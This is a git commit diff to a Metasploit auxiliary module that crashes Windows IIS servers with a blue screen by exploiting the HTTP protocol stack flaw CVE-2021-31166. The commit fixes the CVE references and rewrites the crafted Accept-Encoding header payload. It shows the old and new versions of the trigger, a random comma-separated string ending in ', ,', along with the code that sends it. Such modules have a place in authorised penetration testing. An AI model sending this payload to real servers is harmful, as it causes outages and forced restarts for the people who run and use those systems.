33e12bf06f274b7bc9b610715a1ca8326f481470
mauricelambert <50479118+mauricelambert@users.noreply.github.com>
2022-03-10 21:20:02 +0100

    Correct CVE number, comments and documentation

--- modules/auxiliary/dos/windows/http/rb_dos_iis_2021_31166.rb
+++ modules/auxiliary/dos/windows/http/rb_dos_iis_2021_31166.rb
@@ -18,20 +18,20 @@ class MetasploitModule < Msf::Auxiliary
     super(
       update_info(
         info,
-        'Name' => 'CVE-2022-21907: HTTP Protocol Stack Remote Code Execution' +
+        'Name' => 'CVE-2021-31166: HTTP Protocol Stack Remote Code Execution' +
           ' Vulnerability - Windows IIS DOS BlueScreen',
         'Description' => 'This module can be used to perform a DOS attack on' +
-          ' IIS server. This module exploit CVE-2022-21907 and causes a Blue' +
+          ' IIS server. This module exploit CVE-2021-31166 and causes a Blue' +
           ' Screen with only one payload.',
         'License' => MSF_LICENSE,
         'Author' => ['Maurice LAMBERT <mauricelambert434@gmail.com>'],
         'Platform' => 'win',
         'References' => [
-          ['CVE', '2022-21907'],
-          ['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2022-21907'],
-          ['URL', 'https://github.com/mauricelambert/CVE-2022-21907']
+          ['CVE', '2021-31166'],
+          ['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2021-31166'],
+          ['URL', 'https://github.com/mauricelambert/CVE-2021-31166']
         ],
-        'DisclosureDate' => '2022-01-11',
+        'DisclosureDate' => '2021-05-11',
         'Notes' => {
           'Stability' => [CRASH_OS_RESTARTS],
           'Reliability' => [IOC_IN_LOGS],
@@ -68,15 +68,14 @@ class MetasploitModule < Msf::Auxiliary
 
     vprint_good('First connection OK. Sending payload...')
 
+    payload = "#{rand(1..7).times.map do
+      (0...(rand(2..5))).map do
+        ('a'..'z').to_a[rand(26)]
+      end.join
+    end.join(', ')}, ,"
+
     payload = {
-      'Accept-Encoding' => Rex::Text.rand_text_alphanumeric(24) +
-      ",&#{Rex::Text.rand_text_alphanumeric(2)}&**" + 
-      "#{Rex::Text.rand_text_alphanumeric(20)}**" + 
-      "#{Rex::Text.rand_text_alphanumeric(1)}," +
-      "#{Rex::Text.rand_text_alphanumeric(73)}," +
-      "#{Rex::Text.rand_text_alphanumeric(71)}," +
-      "#{Rex::Text.rand_text_alphanumeric(27)},***************" +
-      "*************#{Rex::Text.rand_text_alphanumeric(6)}, *, ,"
+      'Accept-Encoding' => payload
     }
 
     res = send_request_cgi({
